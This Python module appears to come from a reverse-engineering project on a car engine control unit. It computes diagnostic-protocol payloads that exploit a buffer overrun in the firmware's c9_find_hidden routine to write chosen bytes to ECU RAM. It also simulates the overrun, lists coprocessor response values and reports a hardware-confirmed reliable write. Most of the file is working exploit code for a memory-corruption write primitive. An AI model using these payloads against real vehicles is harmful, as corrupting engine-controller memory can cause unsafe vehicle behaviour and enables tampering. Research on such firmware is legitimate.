"""ECU RAM write primitive via the c9_find_hidden buffer overrun.

Computes 20-address C9 payloads that write a chosen byte to a chosen address
in the $0740-$083F downstream range.  The mechanism:

  1. Positions 0-14: fill the 10-entry c9_hidden_addr/idx arrays normally,
     then overrun into handler state (i=10..14).
  2. Position 15 ($5E0A): addr_store hits $07E1/$07E2, setting n=$0A and
     cursor=$0E.  idx_store re-reads n=$0A, writes 15 to $07E1, INC -> $10.
  3. Position 16 ($5E0B): addr_store hits $07E3, writing $0B (bits 0+1 set,
     repairing the flag byte).  idx_store writes 16 to $07E7 (c9_sub_value).
  4. Position 17: addr_store hits $07E5, writing the target payload index
     (target - $0740) as the low byte.  This becomes c9_hidden_idx[$0E].
  5. Position 18: addr_store hits $07E7, writing a forwarded address's low
     byte.  This sets c9_sub_value — but mailbox_receive at $C862 overwrites
     $07E7 with the H8's response before the builder reads it.
  6. Position 19: dummy (no critical effect).

VALUE CONTROL STATUS (2026-11-16): reliable write achieved.  Double-tap
(two back-to-back overruns, 1 frame each, no key cycle between) writes $93
to the target, 5/5 trials confirmed.  write-access/tools/c9_write_primed.py --taps 2.

The builder at L_9B3F rewrites the target on EVERY frame using $07E7.  With
multiple frames, later frames clobber frame 0's value.  Fix: stream 1 frame.
Tap 1 primes the H8 FIFO past $00 entries; tap 2 catches $93.

Value $93 is deterministic for fill=$5E00x15 + double-tap, but not yet
independently controllable.  Next: vary fill addresses to shift the FIFO
drain position and get different values.

References: ROM_ANALYSIS.md sec 10 and write-access/docs/CONSULT_RAM_MAP.md.
"""

CS_PAYLOAD    = 0x0740
HIDDEN_ADDR   = 0x07C3
HIDDEN_IDX    = 0x07D7
HIDDEN_N      = 0x07E1
REPLY_CURSOR  = 0x07E2
FWD_FLAGS     = 0x07E3
C9_SUB_VAL    = 0x07E7
FORWARD_LO    = 0x5D40
FORWARD_HI    = 0x623F

# H8 response lookup table (h8_sweep.py 2026-11-16, key on / engine off, 3 passes).
# ONE-SHOT READS ONLY — invalid in streaming context.  In streaming, the H8
# serves from an internal sequential FIFO that ignores the requested address;
# position 18 always returns $00.  Use spread fill + empirical calibration
# (write-access/tools/c9_write_fifo.py) for streaming value control.
H8_VALUE_TABLE = {
    0x00: 0x5D44, 0x01: 0x5D80, 0x02: 0x6180, 0x03: 0x6228,
    0x04: 0x6178, 0x08: 0x6138, 0x0E: 0x5DC8, 0x0F: 0x5D98,
    0x10: 0x6158, 0x11: 0x61F0, 0x1C: 0x60A0, 0x21: 0x5F18,
    0x30: 0x6148, 0x33: 0x6020, 0x37: 0x6218, 0x3B: 0x5FD0,
    0x3D: 0x5E38, 0x40: 0x6110, 0x42: 0x6150, 0x47: 0x5E60,
    0x5B: 0x6170, 0x5F: 0x5F20, 0x60: 0x6190, 0x64: 0x61E8,
    0x80: 0x60A8, 0x81: 0x6118, 0x88: 0x5D88, 0x9E: 0x5D48,
    0xC0: 0x60F0, 0xC1: 0x6068, 0xCE: 0x61B0, 0xFD: 0x5D68,
    0xFF: 0x5DC0,
}

# RAM cleared by consult_reset (stop / reinit).  Writes here take effect
# during streaming but are wiped before post-stop readback.
_RESET_PAIRS = [
    (0x073A, 1),   # cs_cmd
    (0x073B, 2),   # cs_argc
    (0x07AC, 2),   # at_req[0..1]
    (0x07AE, 2),   # at_req[2..3]
    (0x07B0, 2),   # at_req[4..5]
    (0x07B7, 2),   # at_active[0..1]
    (0x07B9, 2),   # at_active[2..3]
    (0x07BB, 2),   # at_active[4..5]
]
RESET_CLEARS = set()
for _base, _n in _RESET_PAIRS:
    RESET_CLEARS.update(range(_base, _base + _n))


def spread_fill(n=15, base=0x5D40, stride=8):
    """Generate n spread fill addresses across H8 record boundaries.

    Each H8 record is 8 bytes.  Spread fill uses byte +0 from n different
    records instead of bytes +0..+14 from one record, changing the FIFO
    content that determines the write value.

    Returns a list of n forwarded addresses.
    """
    addrs = []
    for i in range(n):
        a = base + i * stride
        if a > FORWARD_HI:
            a = FORWARD_LO + ((a - FORWARD_LO) % (FORWARD_HI - FORWARD_LO + 1))
        addrs.append(a)
    return addrs


def compute_payload(target, value=None, h8_addr=None, fill_addrs=None):
    """Return a 20-element list of C9 addresses that writes to `target`.

    Target must be in $0740-$083F (the downstream OOB range).

    Fill addresses (positions 0-14) determine the H8 FIFO content and thus
    the written value.  Three modes:

    1. fill_addrs: explicit list of 15 forwarded addresses for positions 0-14.
       Position 18 is set to fill_addrs[0] (arbitrary; it's irrelevant in
       streaming).  value/h8_addr are ignored.

    2. h8_addr: legacy mode, uses $5E00 fill with h8_addr at position 18.
       Only valid for one-shot (non-streaming) contexts.

    3. value + H8_VALUE_TABLE: legacy mode, looks up h8_addr from the table.
       Only valid for one-shot contexts.
    """
    if not 0x0740 <= target <= 0x083F:
        raise ValueError(
            f"target ${target:04X} outside downstream range $0740-$083F")

    target_idx = (target - CS_PAYLOAD) & 0xFF
    repair_a = 0x5E0A
    repair_b = 0x5E0B
    tgt_addr = 0x5E00 + target_idx

    if fill_addrs is not None:
        if len(fill_addrs) != 15:
            raise ValueError(f"fill_addrs must be 15 elements, got {len(fill_addrs)}")
        for i, a in enumerate(fill_addrs):
            if not FORWARD_LO <= a <= FORWARD_HI:
                raise ValueError(
                    f"fill_addrs[{i}] ${a:04X} outside forwarded range")
        val_addr = fill_addrs[0]
        return list(fill_addrs) + [repair_a, repair_b, tgt_addr, val_addr, 0x5E00]

    if value is not None and not 0x00 <= value <= 0xFF:
        raise ValueError(f"value ${value:02X} outside 0-$FF")

    main = 0x5E00

    if h8_addr is not None:
        if not FORWARD_LO <= h8_addr <= FORWARD_HI:
            raise ValueError(
                f"h8_addr ${h8_addr:04X} outside forwarded range")
        val_addr = h8_addr
    elif value is not None and value in H8_VALUE_TABLE:
        val_addr = H8_VALUE_TABLE[value]
    elif value is not None:
        available = sorted(H8_VALUE_TABLE.keys())
        raise ValueError(
            f"value ${value:02X} not in H8 lookup table (one-shot only); "
            f"available: {', '.join(f'${v:02X}' for v in available)}; "
            f"use fill_addrs for streaming value control")
    else:
        val_addr = main

    return [main] * 15 + [repair_a, repair_b, tgt_addr, val_addr, main]


def simulate_overrun(addr_list):
    """Simulate c9_find_hidden with exact M37732 instruction semantics.

    Returns (ram_dict, store_log) where store_log is a list of
    (kind, iteration, dest_addr, value) tuples.
    """
    ram = {}

    def rb(a):
        return ram.get(a, 0)

    def wb(a, v):
        ram[a] = v & 0xFF

    def rw(a):
        return rb(a) | (rb(a + 1) << 8)

    def ww(a, v):
        wb(a, v & 0xFF)
        wb(a + 1, (v >> 8) & 0xFF)

    cs_argc = len(addr_list) * 2
    for i, a in enumerate(addr_list):
        ww(0x08D2 + 2 * i, a)

    wb(HIDDEN_N, 0)
    wb(FWD_FLAGS, rb(FWD_FLAGS) & ~0x03)

    stores = []
    for i in range(20):
        if 2 * i >= cs_argc:
            break
        a_val = rw(0x08D2 + 2 * i)
        if not (FORWARD_LO <= a_val < 0x6240):
            if 2 * (i + 1) >= cs_argc:
                break
            continue

        wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x01)

        n = rb(HIDDEN_N)
        addr_idx = (2 * n) & 0xFF
        addr_dest = HIDDEN_ADDR + addr_idx
        word = a_val - 0x5000
        ww(addr_dest, word)
        stores.append(("addr", i, addr_dest, word))

        n_re = rb(HIDDEN_N)
        idx_dest = HIDDEN_IDX + n_re
        wb(idx_dest, i & 0xFF)
        stores.append(("idx", i, idx_dest, i & 0xFF))

        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)

        if 2 * (i + 1) >= cs_argc:
            break

    return ram, stores


def simulate_builder_write(ram, h8_response=None):
    """Simulate one frame of consult_reply_c9 at L_9B3F.

    Returns a dict with target, value, cursor, idx on success, or None if the
    builder would skip hidden processing (bit 0 or bit 1 not set).

    If h8_response is given, it replaces c9_sub_value before the builder reads
    it — modeling the confirmed mailbox_receive clobber at $C862.  On hardware,
    the written value is always the H8's response for position 18, not the
    pre-loaded byte from the overrun.
    """
    flags = ram.get(FWD_FLAGS, 0)
    if not (flags & 0x01):
        return None
    if not (flags & 0x02):
        return None

    if h8_response is not None:
        ram[C9_SUB_VAL] = h8_response & 0xFF
    sub_val = ram.get(C9_SUB_VAL, 0)
    cursor = ram.get(REPLY_CURSOR, 0)
    idx_val = ram.get(HIDDEN_IDX + cursor, 0)
    target = CS_PAYLOAD + idx_val

    return {
        "target": target,
        "value": sub_val,
        "cursor": cursor,
        "idx": idx_val,
    }


def simulate_write(target, value=None, fill_addrs=None):
    """Full dry-run simulation of a write operation.

    Returns a dict with payload, overrun stores, post-overrun RAM, predicted
    builder write, and whether the target survives consult_reset.

    With fill_addrs, value is unknown (determined by H8 FIFO at runtime).
    """
    payload = compute_payload(target, value=value, fill_addrs=fill_addrs)
    ram, stores = simulate_overrun(payload)
    write = simulate_builder_write(ram, h8_response=value)

    return {
        "payload": payload,
        "stores": stores,
        "ram": ram,
        "write": write,
        "persistent": target not in RESET_CLEARS,
    }


def region_label(addr):
    """Human-readable label for a downstream address."""
    regions = [
        (0x0740, 0x0768, "cs_payload", 0x0740),
        (0x076F, 0x079D, "at_values", 0x076F),
        (0x07A0, 0x07A4, "cs_streamlist", 0x07A0),
        (0x07AC, 0x07B7, "at_req", 0x07AC),
        (0x07B7, 0x07C3, "at_active", 0x07B7),
        (0x07C3, 0x07D7, "c9_hidden_addr", 0x07C3),
        (0x07D7, 0x07E1, "c9_hidden_idx", 0x07D7),
        (0x07E1, 0x07E8, "overrun_state", 0x07E1),
        (0x0810, 0x0840, "dtc_seen", 0x0810),
    ]
    for lo, hi, name, base in regions:
        if lo <= addr < hi:
            return f"{name}[{addr - base}]"
    return ""
